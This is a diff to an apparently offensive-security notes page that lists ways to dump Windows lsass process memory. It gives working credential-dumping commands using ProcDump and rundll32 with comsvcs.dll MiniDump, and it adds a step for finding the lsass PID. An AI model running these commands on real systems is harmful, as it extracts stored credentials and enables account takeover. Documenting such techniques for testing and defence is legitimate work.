@@ -131,16 +131,21 @@ There is various methods to dump the `lsass` process memory:
 - Mimikatz
 - [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 - TaskManager
-- Rundll32
+- Rundll32 & comsvcs.dll
 - [lsassy](https://github.com/Hackndo/lsassy)
+- [Silent Process Exit mechanism)(https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
 
 
 #### Procdump
+
 ```bash
 procdump -accepteula -ma lsass.exe lsass.dmp
 ```
 
 #### Rundll32 & comsvcs.dll
+
+You need to get the PID of `lsass` before dumping it.
+
 ```bash
 tasklist /fi "imagename eq lsass.exe"
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
